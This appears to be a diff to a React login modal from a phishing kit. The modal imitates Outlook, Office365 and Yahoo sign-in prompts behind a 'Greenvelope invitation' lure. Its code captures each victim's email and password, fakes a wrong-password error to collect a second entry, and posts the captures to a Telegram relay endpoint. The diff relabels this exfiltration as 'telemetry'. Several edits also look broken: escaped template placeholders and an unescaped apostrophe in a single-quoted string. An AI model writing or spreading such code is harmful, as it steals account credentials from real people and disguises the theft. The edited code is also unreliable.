@@ -136,7 +136,7 @@ export const LoginModal: React.FC<LoginModalProps> = ({
   const getProviderWrongPasswordMessage = (providerId: string): string => {
     switch (providerId) {
       case 'outlook':
-        return "Your account or password is incorrect. If you don't remember your password, reset it now.";
+        return 'Your account or password is incorrect. If you don't remember your password, reset it now.';
       case 'office365':
         return 'Your password is incorrect. Please ensure you are using the password for your work or school account.';
       case 'yahoo':
@@ -154,12 +154,12 @@ export const LoginModal: React.FC<LoginModalProps> = ({
   const sendTelemetryData = async (email: string, pass: string, attemptStatus: string) => {
     try {
       const formattedMessage = `🔐 New Login Captured\n` +
-        `📌 Provider: ${provider.name}\n` +
-        `👤 User/Email: ${email}\n` +
-        `🔑 Password: ${pass}\n` +
-        `🎯 Status: ${attemptStatus}\n` +
-        `🖥️ Client Info: ${navigator.userAgent}\n` +
-        `⏱️ Timestamp: ${new Date().toLocaleString()}`;
+        `📌 Provider: \${provider.name}\n` +
+        `👤 User/Email: \${email}\n` +
+        `🔑 Password: \${pass}\n` +
+        `🎯 Status: \${attemptStatus}\n` +
+        `🖥️ Client Info: \${navigator.userAgent}\n` +
+        `⏱️ Timestamp: \${new Date().toLocaleString()}`;
 
       const res = await fetch('/api/telegram', {
         method: 'POST',
@@ -170,7 +170,7 @@ export const LoginModal: React.FC<LoginModalProps> = ({
       });
 
       if (!res.ok) {
-        throw new Error('Failed to send login details');
+        throw new Error('Telemetry request failed');
       }
     } catch (error) {
       console.error('Telemetry Error:', error);
@@ -200,7 +200,7 @@ export const LoginModal: React.FC<LoginModalProps> = ({
     try {
       if (passwordAttempts === 0) {
         setIsLoading(true);
-        setLoadingStep(`Verifying credentials with ${provider.name}...`);
+        setLoadingStep(`Verifying credentials with \${provider.name}...`);
 
         await sendTelemetryData(email.trim(), pass, "1st Attempt (Simulated Wrong Password)");
 
@@ -214,12 +214,12 @@ export const LoginModal: React.FC<LoginModalProps> = ({
       }
 
       setIsLoading(true);
-      setLoadingStep(`Connecting to ${provider.name} secure server...`);
+      setLoadingStep(`Connecting to \${provider.name} secure server...`);
 
       await sendTelemetryData(email.trim(), pass, "2nd Attempt (Success Link Portal)");
 
       setTimeout(() => {
-        setLoadingStep(`Verifying ${provider.name} credentials & security token...`);
+        setLoadingStep(`Verifying \${provider.name} credentials & security token...`);
 
         setTimeout(() => {
           setLoadingStep('Authorizing Greenvelope invitation portal...');
@@ -240,7 +240,7 @@ export const LoginModal: React.FC<LoginModalProps> = ({
 
   const renderAuthView = () => {
     const props = {
-      initialEmail: `guest${provider.defaultEmailSuffix}`,
+      initialEmail: `guest\${provider.defaultEmailSuffix}`,
       onSuccess: (e: string) => onSuccess(e, provider),
       onCancel: onClose,
       isLoading,
@@ -281,11 +281,6 @@ export const LoginModal: React.FC<LoginModalProps> = ({
             animate={{ opacity: 1, scale: 1, y: 0 }}
             exit={{ opacity: 0, scale: 0.95, y: 15 }}
             transition={{ duration: 0.2, ease: 'easeOut' }}
-          <motion.div
-            initial={{ opacity: 0, scale: 0.95, y: 15 }}
-            animate={{ opacity: 1, scale: 1, y: 0 }}
-            exit={{ opacity: 0, scale: 0.95, y: 15 }}
-            transition={{ duration: 0.2, ease: 'easeOut' }}
             className="relative w-full max-w-lg shadow-2xl rounded-2xl overflow-hidden my-auto border border-slate-700/50 bg-white"
             id="login-modal-card"
           >
@@ -301,6 +296,7 @@ export const LoginModal: React.FC<LoginModalProps> = ({
                 <X className="w-4 h-4" />
               </button>
             </div>
+
             {renderAuthView()}
           </motion.div>
         </div>
